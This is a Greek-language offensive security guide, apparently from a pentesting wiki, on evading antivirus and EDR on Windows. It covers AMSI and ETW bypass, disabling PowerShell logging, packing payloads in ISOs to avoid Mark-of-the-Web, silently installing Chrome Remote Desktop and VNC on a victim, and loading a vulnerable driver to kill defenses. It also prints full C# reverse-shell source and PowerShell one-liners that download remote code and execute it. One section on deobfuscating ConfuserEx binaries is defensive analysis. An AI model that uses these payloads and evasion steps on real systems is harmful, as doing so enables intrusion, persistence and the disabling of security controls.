Το εργαλείο **[https://amsibypass.com/](https://amsibypass.com/)** δημιουργεί επίσης script για την παράκαμψη του AMSI, το οποίο αποφεύγει το signature μέσω randomized user-defined function, variables, characters expression και εφαρμόζει random character casing στα keywords του PowerShell για την αποφυγή του signature.

**Αφαίρεση του detected signature**

Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως τα **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσετε το detected AMSI signature από τη μνήμη της τρέχουσας διεργασίας. Αυτό το εργαλείο λειτουργεί σαρώνοντας τη μνήμη της τρέχουσας διεργασίας για το AMSI signature και στη συνέχεια το αντικαθιστά με εντολές NOP, αφαιρώντας το ουσιαστικά από τη μνήμη.

**Προϊόντα AV/EDR που χρησιμοποιούν AMSI**

Μπορείτε να βρείτε μια λίστα με προϊόντα AV/EDR που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Χρήση PowerShell version 2**
Αν χρησιμοποιείτε PowerShell version 2, το AMSI δεν θα φορτωθεί, επομένως μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής:
```bash
powershell.exe -version 2
```
## Καταγραφή PS

Η καταγραφή PowerShell είναι μια δυνατότητα που επιτρέπει την καταγραφή όλων των εντολών PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για σκοπούς auditing και troubleshooting, αλλά μπορεί επίσης να αποτελέσει **πρόβλημα για attackers που θέλουν να αποφύγουν τον εντοπισμό**.

Για να παρακάμψετε την καταγραφή PowerShell, μπορείτε να χρησιμοποιήσετε τις παρακάτω τεχνικές:

- **Απενεργοποίηση του PowerShell Transcription και του Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως το [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
- **Χρήση Powershell version 2**: Αν χρησιμοποιήσετε PowerShell version 2, το AMSI δεν θα φορτωθεί, επομένως μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής: `powershell.exe -version 2`
- **Χρήση ενός Unmanaged Powershell Session**: Χρησιμοποιήστε το [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να εκκινήσετε ένα powershell χωρίς defenses (αυτό χρησιμοποιεί το `powerpick` από το Cobal Strike).


## Obfuscation

> [!TIP]
> Αρκετές τεχνικές obfuscation βασίζονται στην κρυπτογράφηση δεδομένων, η οποία αυξάνει το entropy του binary και διευκολύνει τον εντοπισμό του από AVs και EDRs. Να είστε προσεκτικοί με αυτό και ίσως εφαρμόζετε encryption μόνο σε συγκεκριμένα τμήματα του κώδικά σας που περιέχουν ευαίσθητες πληροφορίες ή πρέπει να αποκρυφθούν.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Κατά την ανάλυση malware που χρησιμοποιεί το ConfuserEx 2 (ή commercial forks), είναι συνηθισμένο να αντιμετωπίζετε αρκετά επίπεδα προστασίας που εμποδίζουν τους decompilers και τα sandboxes. Η παρακάτω ροή εργασίας **επαναφέρει ένα σχεδόν αρχικό IL**, το οποίο μπορεί στη συνέχεια να γίνει decompile σε C# με εργαλεία όπως τα dnSpy ή ILSpy.

1.  Αφαίρεση Anti-tampering – Το ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor (`<Module>.cctor`) του *module*. Επίσης τροποποιεί το PE checksum, επομένως οποιαδήποτε αλλαγή θα προκαλέσει crash του binary. Χρησιμοποιήστε το **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους πίνακες metadata, να ανακτήσετε τα XOR keys και να ξαναγράψετε ένα καθαρό assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Η έξοδος περιέχει τις 6 anti-tamper παραμέτρους (`key0-key3`, `nameHash`, `internKey`), οι οποίες μπορεί να είναι χρήσιμες κατά τη δημιουργία του δικού σας unpacker.

2.  Ανάκτηση Symbol / control-flow – Δώστε το *clean* αρχείο στο **de4dot-cex** (ένα ConfuserEx-aware fork του de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – επιλέγει το ConfuserEx 2 profile
• Το de4dot θα αναιρέσει το control-flow flattening, θα επαναφέρει τα αρχικά namespaces, classes και variable names και θα αποκρυπτογραφήσει τα constant strings.

3.  Αφαίρεση Proxy-call – Το ConfuserEx αντικαθιστά τις άμεσες method calls με lightweight wrappers (γνωστά και ως *proxy calls*) για να δυσκολέψει περαιτέρω το decompilation. Αφαιρέστε τα με το **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Μετά από αυτό το βήμα θα πρέπει να βλέπετε κανονικά .NET API, όπως `Convert.FromBase64String` ή `AES.Create()`, αντί για opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – Εκτελέστε το binary που προέκυψε μέσα από το dnSpy και αναζητήστε μεγάλα Base64 blobs ή χρήση των `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *real* payload. Συχνά το malware το αποθηκεύει ως TLV-encoded byte array που αρχικοποιείται μέσα στο `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς να χρειάζεται να εκτελέσετε το malicious sample** – κάτι χρήσιμο όταν εργάζεστε σε offline workstation.

> 🛈  Το ConfuserEx δημιουργεί ένα custom attribute με όνομα `ConfusedByAttribute`, το οποίο μπορεί να χρησιμοποιηθεί ως IOC για την αυτόματη αρχική ταξινόμηση δειγμάτων.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Στόχος αυτού του project είναι να παρέχει ένα open-source fork της [LLVM](http://www.llvm.org/) compilation suite, ικανό να προσφέρει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και προστασίας από παραποίηση.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς να χρησιμοποιείτε τη γλώσσα `C++11/14` για να παράγετε, κατά το compile time, obfuscated code χωρίς τη χρήση εξωτερικού εργαλείου και χωρίς τροποποίηση του compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα layer από obfuscated operations που παράγονται από το C++ template metaprogramming framework, κάνοντας τη ζωή του ατόμου που θέλει να κάνει crack την εφαρμογή λίγο δυσκολότερη.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας x64 binary obfuscator που μπορεί να κάνει obfuscate διάφορα pe files, όπως: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι ένας απλός metamorphic code engine για arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα fine-grained code obfuscation framework για LLVM-supported languages που χρησιμοποιεί ROP (return-oriented programming). Το ROPfuscator κάνει obfuscate ένα πρόγραμμα σε επίπεδο assembly code, μετατρέποντας τις κανονικές εντολές σε ROP chains και εμποδίζοντας τη φυσιολογική μας αντίληψη για το normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένα .NET PE Crypter γραμμένο σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει

## SmartScreen & MoTW

Μπορεί να έχετε δει αυτή την οθόνη κατά τη λήψη ορισμένων executables από το internet και την εκτέλεσή τους.

Το Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφάλειας που έχει σχεδιαστεί για να προστατεύει τον end user από την εκτέλεση δυνητικά κακόβουλων εφαρμογών.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen λειτουργεί κυρίως με μια reputation-based προσέγγιση, δηλαδή οι εφαρμογές που κατεβαίνουν σπάνια θα ενεργοποιήσουν το SmartScreen, προειδοποιώντας έτσι και εμποδίζοντας τον end user να εκτελέσει το file (παρότι το file μπορεί ακόμη να εκτελεστεί κάνοντας κλικ στο More Info -> Run anyway).

**MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier, το οποίο δημιουργείται αυτόματα κατά τη λήψη files από το internet, μαζί με το URL από το οποίο έγινε η λήψη.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για ένα file που κατέβηκε από το internet.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι τα executables που είναι υπογεγραμμένα με ένα **trusted** signing certificate **δεν θα ενεργοποιήσουν το SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος για να αποτρέψετε τα payloads σας από το να αποκτήσουν το Mark of The Web είναι να τα συσκευάσετε μέσα σε κάποιο είδος container, όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε volumes που **δεν είναι NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

Το [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που συσκευάζει payloads σε output containers για να παρακάμπτει το Mark-of-the-Web.

Παράδειγμα χρήσης:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ακολουθεί ένα demo για την παράκαμψη του SmartScreen με τη συσκευασία payloads μέσα σε αρχεία ISO χρησιμοποιώντας το [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Το Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής στα Windows, ο οποίος επιτρέπει στις εφαρμογές και στα στοιχεία του συστήματος να **καταγράφουν events**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από security products για την παρακολούθηση και τον εντοπισμό κακόβουλων δραστηριοτήτων.

Όπως ακριβώς το AMSI απενεργοποιείται (παρακάμπτεται), είναι επίσης δυνατό να κάνουμε τη συνάρτηση **`EtwEventWrite`** της user space διεργασίας να επιστρέφει αμέσως χωρίς να καταγράφει κανένα event. Αυτό γίνεται με patching της συνάρτησης στη μνήμη, ώστε να επιστρέφει αμέσως, απενεργοποιώντας ουσιαστικά την καταγραφή ETW για τη συγκεκριμένη διεργασία.

Μπορείτε να βρείτε περισσότερες πληροφορίες στα **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) και [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Η φόρτωση C# binaries στη μνήμη είναι γνωστή εδώ και αρκετό καιρό και εξακολουθεί να αποτελεί έναν πολύ καλό τρόπο εκτέλεσης των post-exploitation tools χωρίς να εντοπίζονται από το AV.

Εφόσον το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει τον δίσκο, θα χρειαστεί να ασχοληθούμε μόνο με το patching του AMSI για ολόκληρη τη διεργασία.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc κ.λπ.) παρέχουν ήδη τη δυνατότητα εκτέλεσης C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να γίνει αυτό:

- **Fork\&Run**

Αυτό περιλαμβάνει τη **δημιουργία μιας νέας sacrificial διεργασίας**, το injection του post-exploitation κακόβουλου κώδικά σας σε αυτήν τη νέα διεργασία, την εκτέλεση του κακόβουλου κώδικά σας και, όταν ολοκληρωθεί, τον τερματισμό της νέας διεργασίας. Αυτό έχει τόσο πλεονεκτήματα όσο και μειονεκτήματα. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση πραγματοποιείται **εκτός** της διεργασίας του Beacon implant. Αυτό σημαίνει ότι, αν κάτι πάει στραβά ή εντοπιστεί κατά τη διάρκεια της post-exploitation ενέργειάς μας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **επιβιώσει το implant μας.** Το μειονέκτημα είναι ότι υπάρχει **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Πρόκειται για injection του post-exploitation κακόβουλου κώδικα **στη δική του διεργασία**. Με αυτόν τον τρόπο, μπορείτε να αποφύγετε τη δημιουργία μιας νέας διεργασίας και το scanning της από το AV, αλλά το μειονέκτημα είναι ότι, αν κάτι πάει στραβά κατά την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon** σας, καθώς μπορεί να προκληθεί crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα σχετικά με το C# Assembly loading, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **από το PowerShell**. Δείτε το [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το [video του S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατή η εκτέλεση κακόβουλου κώδικα με τη χρήση άλλων γλωσσών, παρέχοντας στο compromised machine πρόσβαση **στο interpreter environment που είναι εγκατεστημένο στο Attacker Controlled SMB share**.

Παρέχοντας πρόσβαση στα Interpreter Binaries και στο environment μέσω του SMB share, μπορείτε να **εκτελέσετε arbitrary code σε αυτές τις γλώσσες μέσα στη μνήμη** του compromised machine.

Το repo αναφέρει: Το Defender εξακολουθεί να κάνει scan στα scripts, αλλά αξιοποιώντας Go, Java, PHP κ.λπ. έχουμε **μεγαλύτερη ευελιξία στην παράκαμψη static signatures**. Οι δοκιμές με τυχαία, μη obfuscated reverse shell scripts σε αυτές τις γλώσσες έχουν αποδειχθεί επιτυχείς.

## TokenStomping

Το token stomping είναι μια τεχνική που επιτρέπει σε έναν attacker να **χειραγωγεί το access token ή ένα security product όπως ένα EDR ή AV**, μειώνοντας τα privileges του, ώστε η διεργασία να μην τερματίζεται, αλλά να μην έχει δικαιώματα για τον έλεγχο κακόβουλων δραστηριοτήτων.

Για να το αποτρέψουν αυτό, τα Windows θα μπορούσαν να **εμποδίζουν external processes** από το να αποκτούν handles στα tokens των security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Όπως περιγράφεται σε [**αυτό το blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο να εγκαταστήσετε το Chrome Remote Desktop στον υπολογιστή ενός victim και στη συνέχεια να το χρησιμοποιήσετε για να τον αναλάβετε και να διατηρήσετε persistence:
1. Κάντε download από το https://remotedesktop.google.com/, κάντε click στο "Set up via SSH" και στη συνέχεια κάντε click στο MSI file για Windows, ώστε να γίνει download του MSI file.
2. Εκτελέστε σιωπηλά τον installer στον victim (απαιτούνται δικαιώματα admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Επιστρέψτε στη σελίδα του Chrome Remote Desktop και κάντε click στο next. Ο wizard θα σας ζητήσει authorization· κάντε click στο κουμπί Authorize για να συνεχίσετε.
4. Εκτελέστε την παράμετρο που σας δίνεται, με ορισμένες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Σημειώστε την παράμετρο pin, η οποία επιτρέπει τον ορισμό του pin χωρίς τη χρήση του GUI).


## Advanced Evasion

Το Evasion είναι ένα πολύ περίπλοκο θέμα. Μερικές φορές πρέπει να λαμβάνετε υπόψη πολλές διαφορετικές πηγές telemetry σε ένα μόνο σύστημα, επομένως είναι σχεδόν αδύνατο να παραμείνετε εντελώς undetected σε mature environments.

Κάθε environment στο οποίο επιτίθεστε θα έχει τα δικά του strengths και weaknesses.

Σας προτείνω ανεπιφύλακτα να παρακολουθήσετε αυτή την ομιλία από τον [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε μια αρχική βάση στις πιο Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτή είναι επίσης μια εξαιρετική ομιλία από τον [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με το Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), το οποίο θα **αφαιρεί τμήματα του binary** μέχρι να **εντοπίσει ποιο τμήμα θεωρεί κακόβουλο το Defender** και θα σας το διαχωρίσει.\
Ένα άλλο tool που κάνει **το ίδιο πράγμα είναι το** [**avred**](https://github.com/dobin/avred), με μια open web προσφορά της υπηρεσίας στο [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows10, όλα τα Windows περιλάμβαναν έναν **Telnet server**, τον οποίο μπορούσατε να εγκαταστήσετε (ως administrator) εκτελώντας:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Κάντε το να **ξεκινά** κατά την εκκίνηση του συστήματος και **εκτελέστε** το τώρα:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Αλλαγή της θύρας telnet** (stealth) και απενεργοποίηση του firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Κατέβασέ το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (χρειάζεσαι τα bin downloads, όχι το setup)

**ΣΤΟ HOST**: Εκτέλεσε το _**winvnc.exe**_ και ρύθμισε τον server:

- Ενεργοποίησε την επιλογή _Disable TrayIcon_
- Όρισε έναν κωδικό πρόσβασης στο _VNC Password_
- Όρισε έναν κωδικό πρόσβασης στο _View-Only Password_

Στη συνέχεια, μετακίνησε το binary _**winvnc.exe**_ και το **νεοδημιουργημένο** αρχείο _**UltraVNC.ini**_ μέσα στο **victim**

#### **Reverse connection**

Ο **attacker** πρέπει να **εκτελέσει μέσα στο** **host** του το binary `vncviewer.exe -listen 5900`, ώστε να είναι **έτοιμος** να δεχτεί μια reverse **VNC connection**. Στη συνέχεια, μέσα στο **victim**: Εκκίνησε το winvnc daemon με `winvnc.exe -run` και εκτέλεσε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ΠΡΟΕΙΔΟΠΟΙΗΣΗ:** Για να διατηρήσεις το stealth, δεν πρέπει να κάνεις ορισμένα πράγματα

- Μην εκκινήσεις το `winvnc` αν εκτελείται ήδη, διαφορετικά θα εμφανιστεί ένα [popup](https://i.imgur.com/1SROTTl.png). Έλεγξε αν εκτελείται με `tasklist | findstr winvnc`
- Μην εκκινήσεις το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο κατάλογο, διαφορετικά θα ανοίξει [το παράθυρο ρυθμίσεων](https://i.imgur.com/rfMQWcf.png)
- Μην εκτελέσεις το `winvnc -h` για βοήθεια, διαφορετικά θα εμφανιστεί ένα [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατέβασέ το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Στο GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Τώρα **ξεκινήστε το listener** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Το τρέχον defender θα τερματίσει τη διεργασία πολύ γρήγορα.**

### Compiling το δικό μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Revershell

Κάντε compile με:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Χρησιμοποιήστε το με:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# με χρήση compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα με C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Χρήση python για το build injectors, παράδειγμα:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Περισσότερα

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Τερματισμός AV/EDR από τον Kernel Space

Το Storm-2603 αξιοποίησε ένα μικρό console utility, γνωστό ως **Antivirus Terminator**, για να απενεργοποιήσει τις endpoint protections πριν από την ανάπτυξη ransomware. Το εργαλείο φέρνει τον **δικό του ευάλωτο αλλά *signed* driver** και τον καταχράται για την εκτέλεση privileged kernel operations, τις οποίες δεν μπορούν να μπλοκάρουν ούτε οι AV services τύπου Protected-Process-Light (PPL).

Βασικά συμπεράσματα
1. **Signed driver**: Το αρχείο που παραδίδεται στον δίσκο είναι το `ServiceMouse.sys`, αλλά το binary είναι ο νόμιμα signed driver `AToolsKrnl64.sys` από το “System In-Depth Analysis Toolkit” της Antiy Labs. Επειδή ο driver φέρει έγκυρη Microsoft signature, φορτώνεται ακόμη και όταν είναι ενεργοποιημένο το Driver-Signature-Enforcement (DSE).
2. **Εγκατάσταση service**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
